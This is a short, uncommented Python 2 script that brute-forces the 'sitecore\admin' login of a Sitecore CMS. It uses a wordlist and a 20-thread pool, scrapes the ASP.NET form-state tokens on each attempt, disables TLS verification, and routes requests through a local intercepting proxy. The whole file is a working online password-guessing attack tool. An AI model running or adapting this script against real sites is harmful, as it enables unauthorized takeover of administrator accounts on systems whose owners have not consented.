#!/usr/bin/env python2

from Queue import Queue
from threading import Thread
import requests
import sys
import re

requests.packages.urllib3.disable_warnings()

def getViewState(data):
    return re.findall('id="__VIEWSTATE" value="([^"]+)', data)[0]

def getViewStateGenerator(data):
    return re.findall('id="__VIEWSTATEGENERATOR" value="([^"]+)', data)[0]

def getEventValidation(data):
    return re.findall('id="__EVENTVALIDATION" value="([^"]+)', data)[0]

class Worker(Thread):
    """Thread executing tasks from a given tasks queue"""
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception, e:
                print e
            finally:
                self.tasks.task_done()

class ThreadPool:
    """Pool of threads consuming tasks from a queue"""
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """Add a task to the queue"""
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        """Wait for completion of all the tasks in the queue"""
        self.tasks.join()

def tryPassword(password):
    if len(password) == 0:
        return
    session = requests.Session()
    req = session.get(url, proxies=proxy, verify=False)
    data = {}
    data['LoginTextBox'] = 'sitecore\\admin'
    data['PasswordTextBox'] = password
    data['ctl05'] = 'Log in'
    data['__VIEWSTATE'] = getViewState(req.text)
    data['__VIEWSTATEGENERATOR'] = getViewStateGenerator(req.text)
    data['__EVENTVALIDATION'] = getEventValidation(req.text)
    req = session.post(url, data=data, proxies=proxy, verify=False)
    if req.text.find('Login failed, please try again') == -1:
        print 'Password: %s' % password

url = ''
proxy = dict(https='http://127.0.0.1:8080')

def main():
    with open('wordlist.txt', 'r') as f:
        passwords = f.readlines()
    passwords = [item.rstrip() for item in passwords]

    pool = ThreadPool(20)
    for password in passwords:
        pool.add_task(tryPassword, password)

    pool.wait_completion()

if __name__ == '__main__':
    main()
